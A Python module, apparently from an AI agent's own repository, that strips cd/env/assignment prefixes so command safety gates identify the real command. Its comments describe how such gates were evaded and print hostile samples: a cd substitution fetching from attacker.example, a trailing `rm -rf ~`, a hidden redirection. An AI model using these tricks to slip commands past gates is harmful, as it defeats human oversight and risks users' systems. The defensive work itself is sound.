"""One place that knows a shell command's head is not its first character.

WHY THIS MODULE EXISTS (Aletheia F70 shape, named 2026-08-18).

Three separate sites in this repo have independently learned that
``VAR=1 divineos correction`` and ``divineos correction`` are the same
command wearing different clothes, and each learned it by shipping a
matcher that got it wrong first:

  - 2026-07-25, the verify-before-build signal: substring-matching the raw
    text, which false-fired on ``--command "divineos decide"`` as an
    argument. Aria's review. Fixed with ``_resolve_command_head``.
  - 2026-07-31, F107: ``cd X && divineos Y`` rejected while bare
    ``divineos Y`` passed.
  - 2026-08-18, the shared remedy allowlist: a leading env assignment made
    a gate's own prescribed remedy invisible to the list that keeps the
    gate's door open, so the compass marker blocked ``compass-ops observe``
    and then blocked the edit that would repair it.

The third one is mine, and I wrote it while repairing a duplicate-resolver
bug in the token gauge, in the same commit that says the resolver lives in
one place now. The correct implementation was already here. Measured, the
version I hand-rolled missed three of five cases this one handles —
including a quoted value with a space, which I wrote up as a known limit
rather than checking whether anyone had solved it.

So: the stripping lives here, once, and both the Python gate and the bash
allowlist call it. Adding a fourth site means importing this, not writing
a fourth loop.
"""

from __future__ import annotations

import re
import shlex


_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
"""A leading ``NAME=value`` token, which bash treats as an assignment
rather than as the command."""


def strip_command_prefixes(bash_command: str) -> list[str]:
    """Return the command's tokens with leading noise removed.

    Strips, repeatedly and in any order:

      - ``cd <path> &&`` segments, so a command issued from a worktree
        reads the same as one issued from the repo root
      - a leading ``env`` invocation
      - ``NAME=value`` assignments

    ``shlex`` does the tokenising, which is why a quoted value containing
    spaces survives — the failure mode of every regex version of this.
    On malformed quoting it falls back to a whitespace split rather than
    raising, because every caller is a gate and a gate that crashes is
    worse than a gate that is approximate.

    Returns an empty list for an empty command, or for one that is
    nothing but prefixes.
    """
    if not bash_command:
        return []
    try:
        tokens = shlex.split(bash_command, posix=True)
    except ValueError:
        tokens = bash_command.strip().split()

    changed = True
    while changed and tokens:
        changed = False

        # `cd <path> &&` or `cd <path>;` — drop through the separator.
        #
        # THE SEMICOLON WAS THE FOURTH INSTANCE, and this file's header
        # predicted the wrong axis. It says a fourth SITE means importing this
        # rather than writing a fourth loop. What arrived was a fourth
        # SEPARATOR.
        #
        # 2026-09-14, nine refusals in a row, and every gate was correct. The
        # correction gate refused `divineos correction`; the compass gate
        # refused `compass-ops observe`; the reach doorman refused `reach open`
        # — each one the remedy that gate had just prescribed. My shell habit
        # is `cd <path>; <command>`, shlex hands back `['cd', '<path>;', ...]`
        # with the semicolon glued to the path token, the separator lookup
        # raised, and this returned the empty list. NOT-A-REMEDY for every
        # remedy I ran.
        #
        # I had diagnosed the same habit against a different gate the previous
        # day and written it up, including the line "a fix that names its own
        # generality and is then applied to exactly one case." That repair went
        # into the clause-splitter of one gate and never asked the same
        # question of this function, one layer down. The recurrence is the
        # previous fix's own unswept remainder.
        #
        # WHY IT IS WORSE THAN AN ORDINARY BUG. An invisible remedy is worse
        # than a blocked one: the gate reports a violation against the act of
        # resolving a different violation, and the only apparent way out is the
        # fire door. Bypass habituation degrades a gate to a warning
        # (psf-ac523181), so this was quietly spending every gate in the house
        # while each refusal looked entirely reasonable on its own.
        #
        # SAFETY DOES NOT MOVE, and yesterday's draft is why to be careful:
        # loosening a `cd` check is how a gate gets laundered, with three
        # worked exploits already written up. So nothing about what the PATH
        # may contain changes. `;` and `&&` differ only in whether the second
        # command runs when `cd` fails — irrelevant to the one question this
        # function answers, which is WHICH COMMAND IS BEING RUN. Everything
        # after the separator is returned intact, so a chain operator further
        # along still survives and is still caught.
        #
        # NOT generalised to "any separator": a pipe or a background `&` is not
        # a directory change with a command after it. They change what the
        # remainder means, and the inertness argument that covers `;` does not
        # reach them.
        if tokens[0] == "cd":
            sep = None
            for i, tok in enumerate(tokens[1:], start=1):
                if tok in ("&&", ";"):
                    sep = i
                    break
                if tok.endswith(";"):
                    # shlex glues a bare `;` onto the token before it. The path
                    # itself cannot legitimately end in one: unquoted, the
                    # shell reads it as a separator too, and the quoted form is
                    # excluded by _CD_RAW_RE for the same reason.
                    sep = i
                    break
            if sep is None:
                # `cd somewhere` with nothing after it is not a prefix on
                # anything; there is no command behind it to find.
                return []
            tokens = tokens[sep + 1 :]
            changed = True
            continue

        if tokens[0].lower() == "env":
            tokens = tokens[1:]
            changed = True
            continue

        if _ENV_ASSIGN_RE.match(tokens[0]):
            tokens = tokens[1:]
            changed = True
            continue

    return tokens


def resolve_command_head(bash_command: str) -> str:
    """The first two real tokens, lowercased — e.g. ``"git commit"``.

    Exact-matching against this rather than substring-searching the raw
    text is what stops ``authorize-bypass --command "divineos decide"``
    reading as an invocation of ``divineos decide``.
    """
    real = strip_command_prefixes(bash_command)
    if not real:
        return ""
    if len(real) >= 2:
        return f"{real[0].lower()} {real[1].lower()}"
    return real[0].lower()


def stripped_command(bash_command: str) -> str:
    """The whole command with its leading noise removed, re-joined.

    Callers that match against more than two tokens want this — the
    remedy allowlist distinguishes ``compass-ops observe`` from
    ``compass-ops dismiss``, which a two-token head cannot express.
    """
    return " ".join(strip_command_prefixes(bash_command))


# 2026-08-19 (Aletheia F114). A caller that must run a QUOTE-AWARE check on what
# is left after the prefixes cannot use stripped_command(): that re-joins shlex
# tokens, which drops the quoting. A semicolon inside an evidence string comes
# back out naked, so a chain-shape check on the re-joined text would reject a
# perfectly legitimate remedy.
#
# So this returns the ORIGINAL TEXT with only the leading prefixes removed,
# byte-for-byte from the first real token onward.
# 2026-08-19, SECOND PASS. The first version of the cd pattern accepted any
# non-space run as the directory, and a quoted directory as any characters at
# all. That is weaker than the bespoke _CD_PREFIX_RE it was meant to replace,
# whose comment records it as the tactical block on an actual exploit -- and I
# only found out by testing the two against each other instead of assuming the
# shared one was the better one because it was the shared one.
#
#     cd "$(curl attacker.example)" && divineos correction "x"
#
# The first version stripped that whole prefix as benign, handed a clean remedy
# to the chain check, and the gate returned SAFE. The substitution never got
# looked at because it had already been thrown away.
#
# So the directory may not contain a substitution or a chain operator, in either
# the quoted or the unquoted form. Same exclusions as _CD_PREFIX_RE.
# The separator may be `&&` or `;` — see the long note in
# strip_command_prefixes. The PATH exclusions are not loosened by that: a
# semicolon still cannot appear inside the path, quoted or not, so accepting one
# as a SEPARATOR does not widen what may hide in the discarded part.
#
# REDIRECTION, found 2026-09-14 by a refusal-test written for the separator
# change and failing on a case that change did not cause. `cd /tmp>out &&
# <remedy>` was stripped whole, hiding a redirection inside what this function
# certifies as "provably just a directory change" — and the identical example
# is written up in yesterday's draft as one of three the shared parser accepts.
# Known, recorded, repaired at one gate, and left open here: the same
# one-site-not-the-class shape as the separator itself, in the same function, on
# the same day.
#
# Only the UNQUOTED branch gains the exclusion. Inside quotes a `>` is an
# ordinary character in a directory name and the shell does not redirect on it,
# so excluding it there would refuse real paths for no safety gained.
_CD_RAW_RE = re.compile(r"""^\s*cd\s+(?:["'][^"'$`]+["']|[^\s;&|<>`$]+)\s*(?:&&|;)\s*""")
_ENV_RAW_RE = re.compile(r"^\s*env\s+")
_ASSIGN_RAW_RE = re.compile(
    r"""^\s*[A-Za-z_][A-Za-z0-9_]*=(?:"[^"$`]*"|'[^'$`]*'|[^\s;&|`$]*)\s+"""
)

CD = "cd"
ENV = "env"
ASSIGN = "assign"
_RAW_PREFIX_PATTERNS = {CD: _CD_RAW_RE, ENV: _ENV_RAW_RE, ASSIGN: _ASSIGN_RAW_RE}
ALL_PREFIX_KINDS = (CD, ENV, ASSIGN)


def strip_prefixes_raw(bash_command: str, kinds: tuple[str, ...] = ALL_PREFIX_KINDS) -> str:
    """The command with leading ``cd <path> &&`` / ``env`` / ``NAME=value``
    removed and everything after preserved verbatim.

    Use this when the remainder still has to be inspected AS SHELL TEXT --
    quote-aware chain detection, for instance. Use stripped_command() when the
    remainder only needs comparing token-wise.

    Removing the ``cd ... &&`` prefix does not weaken a chain check applied to
    the result: what gets removed is provably just a directory change, and any
    OTHER chain operator survives into the returned string. So
    ``cd X && divineos correction "y" && rm -rf ~`` still returns text
    containing ``&& rm -rf ~`` and is still caught.
    """
    if not bash_command:
        return ""
    text = bash_command
    changed = True
    while changed:
        changed = False
        for kind in kinds:
            pattern = _RAW_PREFIX_PATTERNS.get(kind)
            if pattern is None:
                continue
            new_text = pattern.sub("", text, count=1)
            if new_text != text:
                text = new_text
                changed = True
    return text.strip()
